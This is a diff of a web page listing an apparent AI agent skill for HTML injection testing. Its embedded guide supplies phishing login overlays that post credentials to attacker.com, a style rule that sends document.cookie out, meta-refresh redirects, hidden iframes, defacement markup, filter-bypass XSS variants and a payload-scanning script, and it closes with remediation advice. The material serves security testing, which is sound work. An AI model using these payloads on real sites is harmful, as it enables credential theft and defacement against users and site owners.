@@ -4,63 +4,113 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>html-injection-testing - AICCLI</title>
-  <meta name="description" content="html-injection-testing - Claude Code skill for AICCLI">
+  <meta name="description" content="This skill should be used when the user asks to "test for HTML injection", "inject HTML into web pages", "perform HTML injection attacks", "deface web applicati">
   <link rel="icon" type="image/x-icon" href="favicon.ico">
-  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
   <style>
-    :root {
-      --bg-dark: #0a0a0f;
-      --glass-bg: rgba(255, 255, 255, 0.03);
-      --glass-border: rgba(255, 255, 255, 0.08);
-      --text-primary: #ffffff;
-      --text-secondary: #a0a0b0;
-      --text-muted: #606070;
-      --accent: #a855f7;
-      --accent-glow: rgba(168, 85, 247, 0.3);
-      --cyan: #22d3ee;
-    }
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: 'Space Grotesk', sans-serif; background: var(--bg-dark); color: var(--text-primary); min-height: 100vh; }
-    body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(ellipse at 20% 20%, rgba(168, 85, 247, 0.15) 0%, transparent 50%), radial-gradient(ellipse at 80% 80%, rgba(34, 211, 238, 0.1) 0%, transparent 50%); pointer-events: none; z-index: -1; }
-    header { position: sticky; top: 0; z-index: 100; backdrop-filter: blur(20px); border-bottom: 1px solid var(--glass-border); background: rgba(10, 10, 15, 0.8); }
-    .header-content { max-width: 1400px; margin: 0 auto; padding: 16px 20px; display: flex; align-items: center; gap: 20px; }
-    .logo-link { display: flex; align-items: center; gap: 12px; text-decoration: none; }
-    .logo { width: 40px; height: 40px; border-radius: 10px; border: 2px solid var(--accent); }
-    .brand { font-size: 24px; font-weight: 700; color: var(--accent); letter-spacing: -1px; }
-    .breadcrumb { margin-left: auto; color: var(--text-secondary); font-size: 14px; }
-    .breadcrumb a { color: var(--text-secondary); text-decoration: none; }
-    .breadcrumb a:hover { color: var(--accent); }
-    .container { max-width: 1400px; margin: 0 auto; padding: 40px 20px; }
-    .card { background: var(--glass-bg); border: 1px solid var(--glass-border); border-radius: 20px; padding: 32px; backdrop-filter: blur(20px); margin-bottom: 30px; }
-    h1 { font-size: 36px; margin-bottom: 16px; letter-spacing: -1px; background: linear-gradient(135deg, var(--accent), var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-    .meta { display: flex; gap: 16px; flex-wrap: wrap; margin-bottom: 24px; }
-    .meta-item { padding: 8px 16px; background: rgba(168, 85, 247, 0.15); border: 1px solid var(--accent); border-radius: 20px; font-size: 13px; color: var(--accent); }
-    .content-section h2 { font-size: 20px; margin: 24px 0 16px; color: var(--text-primary); }
-    pre { background: rgba(0, 0, 0, 0.4); border: 1px solid var(--glass-border); border-radius: 16px; padding: 24px; overflow-x: auto; font-family: 'JetBrains Mono', monospace; font-size: 14px; line-height: 1.6; color: var(--text-secondary); white-space: pre-wrap; word-wrap: break-word; }
-    code { background: rgba(168, 85, 247, 0.15); padding: 2px 8px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; color: var(--cyan); }
-    .description { font-size: 16px; color: var(--text-secondary); line-height: 1.7; margin-bottom: 24px; }
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:'Inter',sans-serif;background:#fafafa;color:#1a1a1a;line-height:1.6}
+    .container{max-width:900px;margin:0 auto;padding:0 24px}
+    header{background:#fff;border-bottom:1px solid #e5e5e5;position:sticky;top:0;z-index:100;padding:12px 0}
+    header .container{display:flex;align-items:center;justify-content:space-between}
+    .logo{display:flex;align-items:center;gap:10px;text-decoration:none}
+    .logo img{width:32px;height:32px;border-radius:6px}
+    .logo span{font-size:18px;font-weight:700;color:#1a1a1a}
+    .nav{display:flex;gap:8px}
+    .nav a{padding:8px 16px;border-radius:6px;text-decoration:none;color:#666;font-size:14px;font-weight:500;transition:all .2s}
+    .nav a:hover{background:#f5f5f5;color:#1a1a1a}
+    .breadcrumb{padding:24px 0 0;font-size:14px;color:#888}
+    .breadcrumb a{color:#666;text-decoration:none}
+    .breadcrumb a:hover{color:#1a1a1a}
+    .content{padding:32px 0 64px}
+    .header{display:flex;align-items:flex-start;gap:20px;margin-bottom:32px}
+    .icon{width:64px;height:64px;background:#f5f5f5;border-radius:16px;display:flex;align-items:center;justify-content:center;font-size:28px;flex-shrink:0}
+    .title{flex:1}
+    .title h1{font-size:32px;font-weight:700;margin-bottom:8px}
+    .title .meta{display:flex;gap:12px;flex-wrap:wrap}
+    .badge{padding:6px 12px;background:#f5f5f5;border-radius:6px;font-size:13px;color:#666}
+    .badge.type{background:#e8f4ff;color:#0066cc}
+    .desc{font-size:18px;color:#444;margin-bottom:32px;line-height:1.7}
+    .section{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px;margin-bottom:24px}
+    .section h2{font-size:20px;font-weight:600;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid #e5e5e5}
+    .install-box{background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:16px}
+    .install-box p{color:#888;font-size:13px;margin-bottom:8px}
+    .install-box code{display:block;color:#4ade80;font-family:'JetBrains Mono',monospace;font-size:14px;word-break:break-all}
+    .copy-btn{float:right;padding:8px 16px;background:#fff;color:#1a1a1a;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:500}
+    .copy-btn:hover{background:#f5f5f5}
+    pre{background:#f8f8f8;border:1px solid #e5e5e5;border-radius:12px;padding:20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.5}
+    .how-to{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px}
+    .how-to h2{font-size:20px;font-weight:600;margin-bottom:16px}
+    .how-to ol{margin:16px 0;padding-left:24px}
+    .how-to li{margin-bottom:12px;color:#444}
+    .how-to code{background:#f5f5f5;padding:2px 6px;border-radius:4px;font-size:13px}
+    .tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
+    .tag{padding:6px 12px;background:#f5f5f5;border-radius:20px;font-size:12px;color:#666}
+    .stats{display:flex;gap:24px;margin-top:20px;padding-top:20px;border-top:1px solid #e5e5e5}
+    .stat{text-align:center}
+    .stat strong{display:block;font-size:24px;font-weight:600;color:#1a1a1a}
+    .stat span{font-size:12px;color:#888}
+    @media(max-width:768px){.header{flex-direction:column}.install-box code{font-size:12px}}
   </style>
 </head>
 <body>
   <header>
-    <div class="header-content">
-      <a href="../index.html" class="logo-link"><img src="../logo.png" alt="AICCLI" class="logo"><span class="brand">AICCLI</span></a>
-      <div class="breadcrumb"><a href="../index.html">Home</a> / <a href="../skill.html">Skill</a> / html-injection-testing</div>
+    <div class="container">
+      <a href="index.html" class="logo"><img src="logo.png" alt="AICCLI"><span>AICCLI</span></a>
+      <nav class="nav">
+        <a href="index.html">Components</a>
+        <a href="docs.html">Docs</a>
+        <a href="install.html">Install</a>
+      </nav>
     </div>
   </header>
+
   <div class="container">
-    <div class="card">
-      <h1>html-injection-testing</h1>
-      <div class="meta">
-        <span class="meta-item">Skill</span>
-        <span class="meta-item">security</span>
+    <div class="breadcrumb">
+      <a href="index.html">Home</a> / <a href="index.html">skills</a> / security / html-injection-testing
+    </div>
+  </div>
+
+  <main class="container content">
+    <div class="header">
+      <div class="icon">⚡</div>
+      <div class="title">
+        <h1>html-injection-testing</h1>
+        <div class="meta">
+          <span class="badge type">Skill</span>
+          <span class="badge">security</span>
+          
+        </div>
       </div>
-      <div class="description"><pre>---
+    </div>
+
+    <p class="desc">This skill should be used when the user asks to "test for HTML injection", "inject HTML into web pages", "perform HTML injection attacks", "deface web applications", or "test content injection vulnerabilities". It provides comprehensive HTML injection attack techniques and testing methodologies.</p>
+
+    <div class="section">
+      <h2>How to Use</h2>
+      <div class="how-to">
+        <ol>
+          <li><strong>Install via CLI:</strong> Run <code>npx aiccli install skills/html-injection-testing</code> in your terminal</li>
+          <li><strong>Or with OpenCode:</strong> Run <code>opencode install skills/html-injection-testing</code></li>
+          <li><strong>Manual install:</strong> Copy the configuration below and add it to your project's config</li>
+        </ol>
+        
+        <div class="install-box">
+          <button class="copy-btn" onclick="copyConfig()">Copy Config</button>
+          <p>Installation Command:</p>
+          <code id="install-cmd">npx aiccli install skills/html-injection-testing</code>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <h2>Configuration</h2>
+      <pre id="config"><code>---
 name: HTML Injection Testing
-description: This skill should be used when the user asks to "test for HTML injection", "inject HTML into web pages", "perform HTML injection attacks", "deface web applications", or "test content injection vulnerabilities". It provides comprehensive HTML injection attack techniques and testing methodologies.
+description: This skill should be used when the user asks to &quot;test for HTML injection&quot;, &quot;inject HTML into web pages&quot;, &quot;perform HTML injection attacks&quot;, &quot;deface web applications&quot;, or &quot;test content injection vulnerabilities&quot;. It provides comprehensive HTML injection attack techniques and testing methodologies.
 metadata:
   author: zebbern
-  version: "1.1"
+  version: &quot;1.1&quot;
 ---
 
 # HTML Injection Testing
@@ -99,7 +149,7 @@ HTML injection occurs when user input is reflected in web pages without proper s
 ```html
 &lt;!-- Vulnerable code example --&gt;
 &lt;div&gt;
-    Welcome, &lt;?php echo $_GET['name']; ?&gt;
+    Welcome, &lt;?php echo $_GET[&#039;name&#039;]; ?&gt;
 &lt;/div&gt;
 
 &lt;!-- Attack input --&gt;
@@ -163,32 +213,32 @@ Test with simple HTML tags:
 &lt;b&gt;Bold Text&lt;/b&gt;
 &lt;i&gt;Italic Text&lt;/i&gt;
 &lt;u&gt;Underlined Text&lt;/u&gt;
-&lt;font color="red"&gt;Red Text&lt;/font&gt;
+&lt;font color=&quot;red&quot;&gt;Red Text&lt;/font&gt;
 
 &lt;!-- Structural elements --&gt;
-&lt;div style="background:red;color:white;padding:10px"&gt;Injected DIV&lt;/div&gt;
+&lt;div style=&quot;background:red;color:white;padding:10px&quot;&gt;Injected DIV&lt;/div&gt;
 &lt;p&gt;Injected paragraph&lt;/p&gt;
 &lt;br&gt;&lt;br&gt;&lt;br&gt;Line breaks
 
 &lt;!-- Links --&gt;
-&lt;a href="http://attacker.com"&gt;Click Here&lt;/a&gt;
-&lt;a href="http://attacker.com"&gt;Legitimate Link&lt;/a&gt;
+&lt;a href=&quot;http://attacker.com&quot;&gt;Click Here&lt;/a&gt;
+&lt;a href=&quot;http://attacker.com&quot;&gt;Legitimate Link&lt;/a&gt;
 
 &lt;!-- Images --&gt;
-&lt;img src="http://attacker.com/image.png"&gt;
-&lt;img src="x" onerror="alert(1)"&gt;  &lt;!-- XSS attempt --&gt;
+&lt;img src=&quot;http://attacker.com/image.png&quot;&gt;
+&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;  &lt;!-- XSS attempt --&gt;
 ```
 
 Testing workflow:
 ```bash
 # Test basic injection
-curl "http://target.com/search?q=&lt;h1&gt;Test&lt;/h1&gt;"
+curl &quot;http://target.com/search?q=&lt;h1&gt;Test&lt;/h1&gt;&quot;
 
 # Check if HTML renders in response
-curl -s "http://target.com/search?q=&lt;b&gt;Bold&lt;/b&gt;" | grep -i "bold"
+curl -s &quot;http://target.com/search?q=&lt;b&gt;Bold&lt;/b&gt;&quot; | grep -i &quot;bold&quot;
 
 # Test in URL-encoded form
-curl "http://target.com/search?q=%3Ch1%3ETest%3C%2Fh1%3E"
+curl &quot;http://target.com/search?q=%3Ch1%3ETest%3C%2Fh1%3E&quot;
 ```
 
 ### Phase 4: Types of HTML Injection
@@ -200,17 +250,17 @@ Payload persists in database:
 ```html
 &lt;!-- Profile bio injection --&gt;
 Name: John Doe
-Bio: &lt;div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;"&gt;
+Bio: &lt;div style=&quot;position:absolute;top:0;left:0;width:100%;height:100%;background:white;&quot;&gt;
      &lt;h1&gt;Site Under Maintenance&lt;/h1&gt;
-     &lt;p&gt;Please login at &lt;a href="http://attacker.com/login"&gt;portal.company.com&lt;/a&gt;&lt;/p&gt;
+     &lt;p&gt;Please login at &lt;a href=&quot;http://attacker.com/login&quot;&gt;portal.company.com&lt;/a&gt;&lt;/p&gt;
      &lt;/div&gt;
 
 &lt;!-- Comment injection --&gt;
 Great article!
-&lt;form action="http://attacker.com/steal" method="POST"&gt;
-    &lt;input name="username" placeholder="Session expired. Enter username:"&gt;
-    &lt;input name="password" type="password" placeholder="Password:"&gt;
-    &lt;input type="submit" value="Login"&gt;
+&lt;form action=&quot;http://attacker.com/steal&quot; method=&quot;POST&quot;&gt;
+    &lt;input name=&quot;username&quot; placeholder=&quot;Session expired. Enter username:&quot;&gt;
+    &lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password:&quot;&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;
 &lt;/form&gt;
 ```
 
@@ -220,7 +270,7 @@ Payload in URL parameters:
 
 ```html
 &lt;!-- URL injection --&gt;
-http://target.com/welcome?name=&lt;h1&gt;Welcome%20Admin&lt;/h1&gt;&lt;form%20action="http://attacker.com/steal"&gt;
+http://target.com/welcome?name=&lt;h1&gt;Welcome%20Admin&lt;/h1&gt;&lt;form%20action=&quot;http://attacker.com/steal&quot;&gt;
 
 &lt;!-- Search result injection --&gt;
 http://target.com/search?q=&lt;marquee&gt;Your%20account%20has%20been%20compromised&lt;/marquee&gt;
@@ -232,11 +282,11 @@ Payload in POST data:
 
 ```bash
 # POST injection test
-curl -X POST -d "comment=&lt;div style='color:red'&gt;Malicious Content&lt;/div&gt;" \
+curl -X POST -d &quot;comment=&lt;div style=&#039;color:red&#039;&gt;Malicious Content&lt;/div&gt;&quot; \
      http://target.com/submit
 
 # Form field injection
-curl -X POST -d "name=&lt;script&gt;alert(1)&lt;/script&gt;&email=test@test.com" \
+curl -X POST -d &quot;name=&lt;script&gt;alert(1)&lt;/script&gt;&amp;email=test@test.com&quot; \
      http://target.com/register
 ```
 
@@ -258,26 +308,26 @@ Create convincing phishing forms:
 
 ```html
 &lt;!-- Fake login form overlay --&gt;
-&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;
-            background:white;z-index:9999;padding:50px;"&gt;
+&lt;div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;
+            background:white;z-index:9999;padding:50px;&quot;&gt;
     &lt;h2&gt;Session Expired&lt;/h2&gt;
     &lt;p&gt;Your session has expired. Please log in again.&lt;/p&gt;
-    &lt;form action="http://attacker.com/capture" method="POST"&gt;
+    &lt;form action=&quot;http://attacker.com/capture&quot; method=&quot;POST&quot;&gt;
         &lt;label&gt;Username:&lt;/label&gt;&lt;br&gt;
-        &lt;input type="text" name="username" style="width:200px;"&gt;&lt;br&gt;&lt;br&gt;
+        &lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;width:200px;&quot;&gt;&lt;br&gt;&lt;br&gt;
         &lt;label&gt;Password:&lt;/label&gt;&lt;br&gt;
-        &lt;input type="password" name="password" style="width:200px;"&gt;&lt;br&gt;&lt;br&gt;
-        &lt;input type="submit" value="Login"&gt;
+        &lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;width:200px;&quot;&gt;&lt;br&gt;&lt;br&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;
     &lt;/form&gt;
 &lt;/div&gt;
 
 &lt;!-- Hidden credential stealer --&gt;
 &lt;style&gt;
-    input { background: url('http://attacker.com/log?data=') }
+    input { background: url(&#039;http://attacker.com/log?data=&#039;) }
 &lt;/style&gt;
-&lt;form action="http://attacker.com/steal" method="POST"&gt;
-    &lt;input name="user" placeholder="Verify your username"&gt;
-    &lt;input name="pass" type="password" placeholder="Verify your password"&gt;
+&lt;form action=&quot;http://attacker.com/steal&quot; method=&quot;POST&quot;&gt;
+    &lt;input name=&quot;user&quot; placeholder=&quot;Verify your username&quot;&gt;
+    &lt;input name=&quot;pass&quot; type=&quot;password&quot; placeholder=&quot;Verify your password&quot;&gt;
     &lt;button&gt;Verify&lt;/button&gt;
 &lt;/form&gt;
 ```
@@ -293,24 +343,24 @@ Website appearance manipulation:
 
 ```html
 &lt;!-- Full page overlay --&gt;
-&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;
+&lt;div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;
             background:#000;color:#0f0;z-index:9999;
-            display:flex;justify-content:center;align-items:center;"&gt;
+            display:flex;justify-content:center;align-items:center;&quot;&gt;
     &lt;h1&gt;HACKED BY SECURITY TESTER&lt;/h1&gt;
 &lt;/div&gt;
 
 &lt;!-- Content replacement --&gt;
 &lt;style&gt;body{display:none}&lt;/style&gt;
-&lt;body style="display:block !important"&gt;
+&lt;body style=&quot;display:block !important&quot;&gt;
     &lt;h1&gt;This site has been compromised&lt;/h1&gt;
 &lt;/body&gt;
 
 &lt;!-- Image injection --&gt;
-&lt;img src="http://attacker.com/defaced.jpg" 
-     style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999"&gt;
+&lt;img src=&quot;http://attacker.com/defaced.jpg&quot; 
+     style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999&quot;&gt;
 
 &lt;!-- Marquee injection (visible movement) --&gt;
-&lt;marquee behavior="alternate" style="font-size:50px;color:red;"&gt;
+&lt;marquee behavior=&quot;alternate&quot; style=&quot;font-size:50px;color:red;&quot;&gt;
     SECURITY VULNERABILITY DETECTED
 &lt;/marquee&gt;
 ```
@@ -322,33 +372,33 @@ Website appearance manipulation:
 ```html
 &lt;!-- Style injection --&gt;
 &lt;style&gt;
-    body { background: url('http://attacker.com/track?cookie='+document.cookie) }
+    body { background: url(&#039;http://attacker.com/track?cookie=&#039;+document.cookie) }
     .content { display: none }
     .fake-content { display: block }
 &lt;/style&gt;
 
 &lt;!-- Inline style injection --&gt;
-&lt;div style="background:url('http://attacker.com/log')"&gt;Content&lt;/div&gt;
+&lt;div style=&quot;background:url(&#039;http://attacker.com/log&#039;)&quot;&gt;Content&lt;/div&gt;
 ```
 
 #### Meta Tag Injection
 
 ```html
 &lt;!-- Redirect via meta refresh --&gt;
-&lt;meta http-equiv="refresh" content="0;url=http://attacker.com/phish"&gt;
+&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://attacker.com/phish&quot;&gt;
 
 &lt;!-- CSP bypass attempt --&gt;
-&lt;meta http-equiv="Content-Security-Policy" content="default-src *"&gt;
+&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src *&quot;&gt;
 ```
 
 #### Form Action Override
 
 ```html
 &lt;!-- Hijack existing form --&gt;
-&lt;form action="http://attacker.com/steal"&gt;
+&lt;form action=&quot;http://attacker.com/steal&quot;&gt;
 
 &lt;!-- If form already exists, add input --&gt;
-&lt;input type="hidden" name="extra" value="data"&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;extra&quot; value=&quot;data&quot;&gt;
 &lt;/form&gt;
 ```
 
@@ -356,10 +406,10 @@ Website appearance manipulation:
 
 ```html
 &lt;!-- Embed external content --&gt;
-&lt;iframe src="http://attacker.com/malicious" width="100%" height="500"&gt;&lt;/iframe&gt;
+&lt;iframe src=&quot;http://attacker.com/malicious&quot; width=&quot;100%&quot; height=&quot;500&quot;&gt;&lt;/iframe&gt;
 
 &lt;!-- Invisible tracking iframe --&gt;
-&lt;iframe src="http://attacker.com/track" style="display:none"&gt;&lt;/iframe&gt;
+&lt;iframe src=&quot;http://attacker.com/track&quot; style=&quot;display:none&quot;&gt;&lt;/iframe&gt;
 ```
 
 ### Phase 8: Bypass Techniques
@@ -372,7 +422,7 @@ Evade basic filters:
 &lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
 
 &lt;!-- Encoding variations --&gt;
-&#60;h1&#62;Encoded&#60;/h1&#62;
+&amp;#60;h1&amp;#62;Encoded&amp;#60;/h1&amp;#62;
 %3Ch1%3EURL%20Encoded%3C%2Fh1%3E
 
 &lt;!-- Tag splitting --&gt;
@@ -389,7 +439,7 @@ Evade basic filters:
 \u003ch1\u003eUnicode\u003c/h1\u003e
 
 &lt;!-- Attribute-based --&gt;
-&lt;div onmouseover="alert(1)"&gt;Hover me&lt;/div&gt;
+&lt;div onmouseover=&quot;alert(1)&quot;&gt;Hover me&lt;/div&gt;
 &lt;img src=x onerror=alert(1)&gt;
 ```
 
@@ -423,32 +473,32 @@ Evade basic filters:
 import requests
 import urllib.parse
 
-target = "http://target.com/search"
-param = "q"
+target = &quot;http://target.com/search&quot;
+param = &quot;q&quot;
 
 payloads = [
-    "&lt;h1&gt;Test&lt;/h1&gt;",
-    "&lt;b&gt;Bold&lt;/b&gt;",
-    "&lt;script&gt;alert(1)&lt;/script&gt;",
-    "&lt;img src=x onerror=alert(1)&gt;",
-    "&lt;a href='http://evil.com'&gt;Click&lt;/a&gt;",
-    "&lt;div style='color:red'&gt;Styled&lt;/div&gt;",
-    "&lt;marquee&gt;Moving&lt;/marquee&gt;",
-    "&lt;iframe src='http://evil.com'&gt;&lt;/iframe&gt;",
+    &quot;&lt;h1&gt;Test&lt;/h1&gt;&quot;,
+    &quot;&lt;b&gt;Bold&lt;/b&gt;&quot;,
+    &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;,
+    &quot;&lt;img src=x onerror=alert(1)&gt;&quot;,
+    &quot;&lt;a href=&#039;http://evil.com&#039;&gt;Click&lt;/a&gt;&quot;,
+    &quot;&lt;div style=&#039;color:red&#039;&gt;Styled&lt;/div&gt;&quot;,
+    &quot;&lt;marquee&gt;Moving&lt;/marquee&gt;&quot;,
+    &quot;&lt;iframe src=&#039;http://evil.com&#039;&gt;&lt;/iframe&gt;&quot;,
 ]
 
 for payload in payloads:
     encoded = urllib.parse.quote(payload)
-    url = f"{target}?{param}={encoded}"
+    url = f&quot;{target}?{param}={encoded}&quot;
     
     try:
         response = requests.get(url, timeout=5)
         if payload.lower() in response.text.lower():
-            print(f"[+] Possible injection: {payload}")
-        elif "&lt;h1&gt;" in response.text or "&lt;b&gt;" in response.text:
-            print(f"[?] Partial reflection: {payload}")
+            print(f&quot;[+] Possible injection: {payload}&quot;)
+        elif &quot;&lt;h1&gt;&quot; in response.text or &quot;&lt;b&gt;&quot; in response.text:
+            print(f&quot;[?] Partial reflection: {payload}&quot;)
     except Exception as e:
-        print(f"[-] Error: {e}")
+        print(f&quot;[-] Error: {e}&quot;)
 ```
 
 ### Phase 10: Prevention and Remediation
@@ -457,13 +507,13 @@ Secure coding practices:
 
 ```php
 // PHP: Escape output
-echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
+echo htmlspecialchars($user_input, ENT_QUOTES, &#039;UTF-8&#039;);
 
 // PHP: Strip tags
 echo strip_tags($user_input);
 
 // PHP: Allow specific tags only
-echo strip_tags($user_input, '&lt;p&gt;&lt;b&gt;&lt;i&gt;');
+echo strip_tags($user_input, &#039;&lt;p&gt;&lt;b&gt;&lt;i&gt;&#039;);
 ```
 
 ```python
@@ -502,10 +552,10 @@ Server-side protections:
 |---------|---------|
 | `&lt;h1&gt;Test&lt;/h1&gt;` | Basic rendering test |
 | `&lt;b&gt;Bold&lt;/b&gt;` | Simple formatting |
-| `&lt;a href="evil.com"&gt;Link&lt;/a&gt;` | Link injection |
+| `&lt;a href=&quot;evil.com&quot;&gt;Link&lt;/a&gt;` | Link injection |
 | `&lt;img src=x&gt;` | Image tag test |
-| `&lt;div style="color:red"&gt;` | Style injection |
-| `&lt;form action="evil.com"&gt;` | Form hijacking |
+| `&lt;div style=&quot;color:red&quot;&gt;` | Style injection |
+| `&lt;form action=&quot;evil.com&quot;&gt;` | Form hijacking |
 
 ### Injection Contexts
 
@@ -522,7 +572,7 @@ Server-side protections:
 | Type | Example |
 |------|---------|
 | URL encoding | `%3Ch1%3E` = `&lt;h1&gt;` |
-| HTML entities | `&#60;h1&#62;` = `&lt;h1&gt;` |
+| HTML entities | `&amp;#60;h1&amp;#62;` = `&lt;h1&gt;` |
 | Double encoding | `%253C` = `&lt;` |
 | Unicode | `\u003c` = `&lt;` |
 
@@ -553,8 +603,39 @@ Server-side protections:
 | HTML not rendering | Check if output HTML-encoded; try encoding variations; verify HTML context |
 | Payload stripped | Use encoding variations; try tag splitting; test null bytes; nested tags |
 | XSS not working (HTML only) | JS filtered but HTML allowed; leverage phishing forms, meta refresh redirects |
-</pre></div>
+</code></pre>
     </div>
-  </div>
+
+    
+
+    <div class="section">
+      <h2>Info</h2>
+      <div class="stats">
+        <div class="stat">
+          <strong>99</strong>
+          <span>Downloads</span>
+        </div>
+        <div class="stat">
+          <strong>1.0</strong>
+          <span>Version</span>
+        </div>
+        <div class="stat">
+          <strong>MIT</strong>
+          <span>License</span>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    function copyConfig() {
+      const config = document.getElementById('config').textContent;
+      navigator.clipboard.writeText(config).then(() => {
+        const btn = document.querySelector('.copy-btn');
+        btn.textContent = 'Copied!';
+        setTimeout(() => btn.textContent = 'Copy Config', 2000);
+      });
+    }
+  </script>
 </body>
 </html>
